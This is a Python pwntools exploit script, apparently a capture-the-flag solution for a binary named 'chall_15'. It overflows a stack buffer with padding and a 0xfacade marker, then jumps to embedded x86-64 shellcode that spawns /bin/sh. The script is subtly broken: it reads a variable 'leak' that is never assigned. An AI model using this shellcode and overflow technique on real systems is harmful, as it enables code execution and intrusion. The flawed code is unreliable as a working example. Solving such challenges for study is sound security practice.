from pwn import *

binary = context.binary = ELF('./chall_15')

p = process('./chall_15')
p.recv()

p.sendline()
stack = int(leak,16)

# http://shell-storm.org/shellcode/files/shellcode-905.php
shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'
shellcode += b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f'
shellcode += b'\x73\x68\x57\x54\x5e\x49\x89\xd0'
shellcode += b'\x49\x89\xd2\x0f\x05'

payload  = b''
payload += (0x4e - 0x44) * b'A'
payload += p32(0xfacade)
payload += (0x10 - (stack + len(payload)) & 0xf) * b'B'

stack += len(payload)

payload += shellcode
payload += (0x4e - len(payload) - 0xc) * b'C'
payload += p32(0xfacade)
payload += (0x4e - len(payload)) * b'D'
payload += p64(stack)

p.sendline(payload)
p.interactive()
